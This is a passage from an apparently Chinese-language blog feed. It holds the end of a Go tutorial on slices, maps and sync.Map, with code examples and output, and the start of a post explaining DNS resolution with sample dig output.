0 0 0 5]<br>panic: runtime error: index out of range [5] with length 5<br><br>goroutine 1 [running]:<br>main.main()<br>/Users/GolandProjects/awesomeProject/hello.go:12 +0x160<br></code></pre></td></tr></table></figure><h2 id="2-切片的截取"><a href="#2-切片的截取" class="headerlink" title="2. 切片的截取"></a>2. 切片的截取</h2><p>切片可以从任意长度开始切，切到任意长度为止，然后这一段拿出来就是一个新的切片。切割形式为</p><p><code>切片名(s)[起始下标(begin):结束下标(end):最大容量(max)]</code></p><p>⚠️：截取到的切片包含起始下标(begin)，不包含结束下标(end)。</p><p>切片截取形式表：</p><table><thead><tr><th align="left">操作</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left">s[begin?max]</td><td align="left">截取切片s从begin到end的数据，构成一个容量为max-begin，长度为begin-end的切片。</td></tr><tr><td align="left">s[begin:end]</td><td align="left">截取切片s从begin到end的数据，构成一个容量和长度均为begin-end的切片。</td></tr><tr><td align="left">s[begin:]</td><td align="left">截取切片s从begin到最后的数据，构成一个容量和长度均为len(s)-end的切片。</td></tr><tr><td align="left">s[:end]</td><td align="left">截取切片s从0到最后的数据，构成一个容量和长度均为end-0的切片。</td></tr></tbody></table><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Println(<span class="hljs-string">&quot;a[1:3]=&quot;</span>, a[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>])<br>fmt.Println(<span class="hljs-string">&quot;a[1:]=&quot;</span>, a[<span class="hljs-number">1</span>:])<br>fmt.Println(<span class="hljs-string">&quot;a[:3]=&quot;</span>, a[:<span class="hljs-number">3</span>])<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">a[1:3]= [2 3]<br>a[1:]= [2 3 4 5]<br>a[:3]= [1 2 3]<br></code></pre></td></tr></table></figure><h2 id="3-切片的追加"><a href="#3-切片的追加" class="headerlink" title="3. 切片的追加"></a>3. 切片的追加</h2><p>切片使用一个 Go 语言的内置函数<code>append(切片，待添加的值)</code>，来进行切片末尾元素的追加。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>a = <span class="hljs-built_in">append</span>(a, <span class="hljs-number">6</span>)<br>fmt.Println(a)<br>a = <span class="hljs-built_in">append</span>(a, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>)<br>fmt.Println(a)<br>b := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">9</span>, <span class="hljs-number">10</span>&#125;<br>a = <span class="hljs-built_in">append</span>(a, b...) <span class="hljs-comment">// 在切片的末尾追加切片，append中待添加的元素是一个数组或切片的时候，在其后面添加 ... 就可以全部追加到切片末尾</span><br>fmt.Println(a)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">[1 2 3 4 5 6]<br>[1 2 3 4 5 6 7 8]<br>[1 2 3 4 5 6 7 8 9 10]<br></code></pre></td></tr></table></figure><h2 id="4-切片的长度和容量"><a href="#4-切片的长度和容量" class="headerlink" title="4. 切片的长度和容量"></a>4. 切片的长度和容量</h2><p>在切片中可以使用<code>len()</code>获取切片中<strong>元素的数量</strong>，也就是切片的长度。使用<code>cap()</code>可以获取切片<strong>引用的数组的长度</strong>，也就切片的容量。切片的容量一般大于等于长度，容量会随着长度的增长而增长。</p><p>在初始化一个切片的时候其实时给切片引用了一个数组，然后容量就是这个数组的长度，然后如果切片的长度超过了切片的容量，它就会让切片引用一个容量更大数组来存放这些元素。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a = []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br>fmt.Printf(<span class="hljs-string">&quot;a的地址%p, a的长度%d, a的容量%d\n&quot;</span>, a, <span class="hljs-built_in">len</span>(a), <span class="hljs-built_in">cap</span>(a))<br>a = <span class="hljs-built_in">append</span>(a, <span class="hljs-number">6</span>)<br>fmt.Printf(<span class="hljs-string">&quot;a的地址%p, a的长度%d, a的容量%d\n&quot;</span>, a, <span class="hljs-built_in">len</span>(a), <span class="hljs-built_in">cap</span>(a))<br>a = <span class="hljs-built_in">append</span>(a, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>)<br>fmt.Printf(<span class="hljs-string">&quot;a的地址%p, a的长度%d, a的容量%d\n&quot;</span>, a, <span class="hljs-built_in">len</span>(a), <span class="hljs-built_in">cap</span>(a))<br>b := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>&#125;<br>a = <span class="hljs-built_in">append</span>(a, b...)<br>fmt.Printf(<span class="hljs-string">&quot;a的地址%p, a的长度%d, a的容量%d\n&quot;</span>, a, <span class="hljs-built_in">len</span>(a), <span class="hljs-built_in">cap</span>(a))<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tex">a的地址0x140000161b0, a的长度5, a的容量5<br>a的地址0x140000181e0, a的长度6, a的容量10<br>a的地址0x140000181e0, a的长度8, a的容量10<br>a的地址0x14000102000, a的长度11, a的容量20<br></code></pre></td></tr></table></figure><p>在切片a每次添加的元素要<strong>超过它的容量</strong>时，它的地址就会发生<strong>改变</strong>，其实就是让它引用了一个新的容量更大的数组。</p><h1 id="Go语言中的Map"><a href="#Go语言中的Map" class="headerlink" title="Go语言中的Map"></a>Go语言中的Map</h1><p>一种元素对的无序集合，每一个**索引(key)对应一个值(value)**，这种数据结构在 Go 语言中被称之为 <strong>map</strong>。</p><p><strong>map</strong> 是一种能够通过<strong>索引(key)迅速找到值(value)<strong>的数据结构，所以也被称为</strong>字典</strong>。在 Go 语言中因为线程安全问题，一共实现了两种类型的 map</p><h2 id="1-无锁的map"><a href="#1-无锁的map" class="headerlink" title="1. 无锁的map"></a>1. 无锁的map</h2><p>这种类型的 map 是线程不安全的 map，多个线程同时访问这个类型的 map 的同一个变量时，会有读写冲突，会导致系统奔溃。所以一般在单线程程序中使用的较多。</p><h3 id="1-1-map的创建"><a href="#1-1-map的创建" class="headerlink" title="1.1 map的创建"></a>1.1 map的创建</h3><p>map 的底层结构也是一个指针，所以和变量不同，并不是声明后立刻能够使用。和切片相同，需要使用make()函数进行初始化。在初始化之前为空，没有零值。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> m <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>     <span class="hljs-comment">// 声明一个key为string类型，value为string类型的map变量</span><br>fmt.Println(m == <span class="hljs-literal">nil</span>)       <span class="hljs-comment">// 此时m未初始化，值为 nil</span><br>m = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>) <span class="hljs-comment">// 初始化m</span><br>fmt.Println(m == <span class="hljs-literal">nil</span>)       <span class="hljs-comment">//此时m 是一个没有存放数据的map，值不为nil</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">true<br>false<br></code></pre></td></tr></table></figure><h3 id="1-2-map的赋值"><a href="#1-2-map的赋值" class="headerlink" title="1.2 map的赋值"></a>1.2 map的赋值</h3><p>map 的赋值有两种方式：</p><ul><li>使用<code>:=</code>使map在定义的时候直接赋值；</li><li>使用<code>map[key]=value</code>的形式对map进行赋值。</li></ul><p>在明确知道 map 的值的时候就可以使用第一种方式进行赋值，比如说在建立中英文对应关系的时候。在未知 map 的取值时，一般建议使用后者进行赋值。</p><p>代码示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>m1 := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Apple&quot;</span>: <span class="hljs-string">&quot;苹果&quot;</span>, <span class="hljs-string">&quot;Orange&quot;</span>: <span class="hljs-string">&quot;橘子&quot;</span>, <span class="hljs-string">&quot;Bannana&quot;</span>: <span class="hljs-string">&quot;香蕉&quot;</span>&#125; <span class="hljs-comment">// 在m1被定义的时候直接赋值</span><br>fmt.Println(m1[<span class="hljs-string">&quot;Apple&quot;</span>])                                                <span class="hljs-comment">// 输出m1中key为&quot;Apple&quot;时对应的值</span><br>m2 := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>)                                           <span class="hljs-comment">//使用:=进行免声明make</span><br>m2[<span class="hljs-string">&quot;Apple&quot;</span>] = <span class="hljs-string">&quot;苹果&quot;</span><br>m2[<span class="hljs-string">&quot;Orange&quot;</span>] = <span class="hljs-string">&quot;橘子&quot;</span><br>m2[<span class="hljs-string">&quot;Banana&quot;</span>] = <span class="hljs-string">&quot;香蕉&quot;</span><br>fmt.Println(m2[<span class="hljs-string">&quot;Apple&quot;</span>]) <span class="hljs-comment">//输出m2中key为&quot;Apple&quot;时对应的值</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">苹果<br>苹果<br></code></pre></td></tr></table></figure><h3 id="1-3-map的遍历"><a href="#1-3-map的遍历" class="headerlink" title="1.3 map的遍历"></a>1.3 map的遍历</h3><p>map 是字典结构，如果不清楚所有 key 的值，是无法对 map 进行遍历的，所以 Go 语言中使用了一个叫做<strong>range</strong>的关键字，配合<strong>for循环结构</strong>来对map结构进行遍历。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Apple&quot;</span>: <span class="hljs-string">&quot;苹果&quot;</span>, <span class="hljs-string">&quot;Orange&quot;</span>: <span class="hljs-string">&quot;橘子&quot;</span>, <span class="hljs-string">&quot;Bannana&quot;</span>: <span class="hljs-string">&quot;香蕉&quot;</span>&#125;<br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> m &#123;<br>fmt.Println(<span class="hljs-string">&quot;key:&quot;</span>, k, <span class="hljs-string">&quot;, value:&quot;</span>, v)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>⚠️：map 是无序的，所以每次输出的顺序可能会不一样。</p><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">key: Apple , value: 苹果<br>key: Orange , value: 橘子<br>key: Bannana , value: 香蕉<br></code></pre></td></tr></table></figure><h3 id="1-4-map的删除"><a href="#1-4-map的删除" class="headerlink" title="1.4 map的删除"></a>1.4 map的删除</h3><p>map 在普通的用法中是无法移除只可以增加 key 和 value 的，所以 Go 语言中使用了一个内置函数<code>delete(map,key)</code>来移除 map 中的 key 和 value。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    m := <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;Apple&quot;</span>: <span class="hljs-string">&quot;苹果&quot;</span>, <span class="hljs-string">&quot;Orange&quot;</span>: <span class="hljs-string">&quot;橘子&quot;</span>, <span class="hljs-string">&quot;Banana&quot;</span>: <span class="hljs-string">&quot;香蕉&quot;</span>&#125;<br>    fmt.Println(m)<br>    <span class="hljs-built_in">delete</span>(m, <span class="hljs-string">&quot;Apple&quot;</span>) <span class="hljs-comment">// 删除 m 中的 “Apple” 和其对应的 value。</span><br>    fmt.Println(m)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">map[Apple:苹果 Banana:香蕉 Orange:橘子]<br>map[Banana:香蕉 Orange:橘子]<br></code></pre></td></tr></table></figure><h2 id="2-自带锁的-sync-Map"><a href="#2-自带锁的-sync-Map" class="headerlink" title="2. 自带锁的 sync.Map"></a>2. 自带锁的 sync.Map</h2><p>这种类型的 map 是线程安全的 map，多个线程同时访问这个类型的 map 的同一个变量时，不会有读写冲突，因为它自带原子锁，保障了多线程的数据安全。</p><h3 id="2-1-sync-Map-的创建"><a href="#2-1-sync-Map-的创建" class="headerlink" title="2.1 sync.Map 的创建"></a>2.1 sync.Map 的创建</h3><p>这种类型的 map 创建<strong>不需要make</strong>，直接声明就可以使用，而且不需要声明 map 的 key 和 value 的类型。因为它底层的实现并不是指针，是一种多个变量的聚合类型，叫做<strong>结构体</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> m sync.Map <span class="hljs-comment">//声明一个 sync.Map</span><br>fmt.Println(m) <span class="hljs-comment">//输出 m 的零值</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tex">&#123;&#123;0 0&#125; &#123;[] &#123;&#125; &lt;nil&gt;&#125; map[] 0&#125;<br></code></pre></td></tr></table></figure><h3 id="2-2-sync-Map-的操作"><a href="#2-2-sync-Map-的操作" class="headerlink" title="2.2 sync.Map 的操作"></a>2.2 sync.Map 的操作</h3><p>这个类型关于 map 的所有操作都是使用它自带的方法来实现的。<strong>包括range</strong>。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> m sync.Map         <span class="hljs-comment">//声明一个 sync.Map</span><br>m.Store(<span class="hljs-string">&quot;Apple&quot;</span>, <span class="hljs-string">&quot;苹果&quot;</span>) <span class="hljs-comment">// 使用Store 方法给m赋值</span><br>m.Store(<span class="hljs-string">&quot;Orange&quot;</span>, <span class="hljs-string">&quot;橘子&quot;</span>)<br>m.Store(<span class="hljs-string">&quot;Banana&quot;</span>, <span class="hljs-string">&quot;香蕉&quot;</span>)<br>tmp, exist := m.Load(<span class="hljs-string">&quot;Orange&quot;</span>) <span class="hljs-comment">//使用Load取出&quot;Orange&quot;对应的值，如果不存在&quot;Orange&quot;这个key，exist的值为false</span><br>fmt.Println(tmp, exist)        <span class="hljs-comment">//删除m中的&quot;Banana&quot;和其对应的value</span><br><br>m.Delete(<span class="hljs-string">&quot;Banana&quot;</span>)<br>m.Range(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(k, v <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">bool</span> &#123; <span class="hljs-comment">// 使用Range方法遍历m</span><br>fmt.Println(<span class="hljs-string">&quot;key:&quot;</span>, k, <span class="hljs-string">&quot;, value:&quot;</span>, v)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">橘子 true<br>key: Apple , value: 苹果<br>key: Orange , value: 橘子<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>code</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS和CDN及其相关原理</title>
    <link href="/2023/04/26/DNS%E5%92%8CCDN%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/"/>
    <url>/2023/04/26/DNS%E5%92%8CCDN%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><h3 id="1-什么是DNS"><a href="#1-什么是DNS" class="headerlink" title="1. 什么是DNS"></a>1. 什么是DNS</h3><p>DNS （Domain Name System 的缩写）是一个分布式数据库，它将域名映射到与之关联的IP地址。DNS使得人们可以使用易于记忆的域名访问网站或其他网络服务，而不是使用长长的IP地址。例如，通过DNS，您可以使用”<a href="https://cyberzone.cloud/">cyberzone.cloud</a>“而不是“185.199.111.153”来访问本博客。</p><p>DNS通常由域名注册商或Internet服务提供商提供。</p><h3 id="2-DNS查询过程"><a href="#2-DNS查询过程" class="headerlink" title="2. DNS查询过程"></a>2. DNS查询过程</h3><p>使用 <strong>dig</strong> 显示整个域名的查询过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig mochazz.cloud<br></code></pre></td></tr></table></figure><p><img src="/../img/DNS%E5%92%8CCDN%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E5%8E%9F%E7%90%86/image-20230427205517356.png" alt="ding mochazz.cloud"></p><p>其中：</p><ul><li><p>查询参数和统计</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; mochazz.cloud<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 7631</span><br><span class="hljs-string">;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 16</span><br></code></pre></td></tr></table></figure></li><li><p>查询内容</p><p>查询域名 **mochazz.cloud **的A记录，即address的记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">;; QUESTION SECTION:<br>;mochazz.cloud.INA<br></code></pre></td></tr></table></figure></li><li><p>DNS服务器的回答</p><p>询问DNS服务器后，会告诉你 <strong>mochazz.cloud</strong> 有哪些 A 记录，即哪些地址， 其中返回的600室TTL值（Time to live 的缩写），表示缓存时间，即600秒之内不用重新查询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">;; ANSWER SECTION:<br>mochazz.cloud.600INA76.76.21.21<br></code></pre></td></tr></table></figure></li><li><p>NS记录（Name Server的缩写）</p><p>即返回哪些服务器负责管理 <strong>mochazz.cloud</strong>的DNS记录，显示结果有2条，向其中任一台查询就知道域名的地址了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">;; AUTHORITY SECTION:<br>mochazz.cloud.3600INNSns4.dnsv2.com.<br>mochazz.cloud.3600INNSns3.dnsv2.com.<br></code></pre></td></tr></table></figure></li><li><p>域名服务器地址</p><p>回复了两个域名服务器的地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">;; ADDITIONAL SECTION:<br>ns3.dnsv2.com.169800INA129.211.176.248<br>ns3.dnsv2.com.169800INA183.47.126.189<br>ns3.dnsv2.com.169800INA183.192.164.118<br>ns3.dnsv2.com.169800INA223.166.151.17<br>ns3.dnsv2.com.169800INA1.12.0.29<br>ns3.dnsv2.com.169800INA117.89.178.226<br>ns4.dnsv2.com.169658INA36.155.149.242<br>ns4.dnsv2.com.169658INA61.151.180.45<br>ns4.dnsv2.com.169658INA112.80.181.103<br>ns4.dnsv2.com.169658INA117.89.178.204<br>ns4.dnsv2.com.169658INA120.241.130.40<br>ns4.dnsv2.com.169658INA223.166.151.18<br>ns4.dnsv2.com.169658INA1.12.0.30<br>ns3.dnsv2.com.158515INAAAA2402:4e00:1430:1102:0:9136:2b2f:bf6b<br>ns4.dnsv2.com.151805INAAAA2402:4e00:1020:1264:0:9136:29bb:2f5e<br></code></pre></td></tr></table></figure></li><li><p>DNS服务器传输的信息</p><p>本机的DNS服务器是192.168.1.1，查询端口是53（DNS服务器的默认端口），以及回应长度是367字节。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">;; Query time: 63 msec<br>;; SERVER: 192.168.1.1<span class="hljs-comment">#53(192.168.1.1)</span><br>;; WHEN: Thu Apr 27 20:51:49 CST 2023<br>;; MSG SIZE  rcvd: 367<br></code></pre></td></tr></table></figure></li></ul><h3 id="3-域名的层级"><a href="#3-域名的层级" class="headerlink" title="3. 域名的层级"></a>3. 域名的层级</h3><p>通过查询内容可以知道</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">;; QUESTION SECTION:<br>;mochazz.cloud.INA<br></code></pre></td></tr></table></figure><p>查询的是 <strong>mochazz.cloud.</strong> 而不是 <strong>mochazz.cloud</strong> </p><p>根本原因是所有域名的尾部，实际上都有一个根域名，对于所有域名都是一样的，所以平时是省略的。</p><p>带上根域名就是 <strong>mochazz.cloud.root</strong> 和 <strong>cyberzone.cloud.root</strong></p><p>然后根域名的下一级为顶级域名（top-level domain，TLD）这里顶级域名为.cloud。 .com .cn都是顶级域名。</p><p>顶级域名的下一级就是次域名（second-level domain，缩写为SLD），这里的次域名为 .mochazz 和 .cyberzone。平时注册域名就是S LD</p><p>次域名的下一级就是主机名（host），比如<a href="http://www.mochazz.cloud/">www.mochazz.cloud</a> 中主机名就是www。是用户在自己的域里面为服务器分配的名称，是用户可以任意分配的。</p><p>域名的层级结构为</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tex">主机名.次级域名.顶级域名.根域名<br>host.SLD.TLD.root<br></code></pre></td></tr></table></figure><h3 id="4-根域名服务器"><a href="#4-根域名服务器" class="headerlink" title="4. 根域名服务器"></a>4. 根域名服务器</h3><p>DNS服务器根据域名的层级，进行分级查询。</p><p>需要明确的是，每一级域名都有自己的NS记录，NS记录指向该级域名的域名服务器。这些服务器知道下一级域名的各种记录。</p><p>所谓”分级查询”，就是从根域名开始，依次查询每一级域名的NS记录，直到查到最终的IP地址，过程大致如下</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">从&quot;根域名服务器&quot;查到&quot;顶级域名服务器&quot;的NS记录和A记录（IP地址）<br>从&quot;顶级域名服务器&quot;查到&quot;次级域名服务器&quot;的NS记录和A记录（IP地址）<br>从&quot;次级域名服务器&quot;查出&quot;主机名&quot;的IP地址<br></code></pre></td></tr></table></figure><p><img 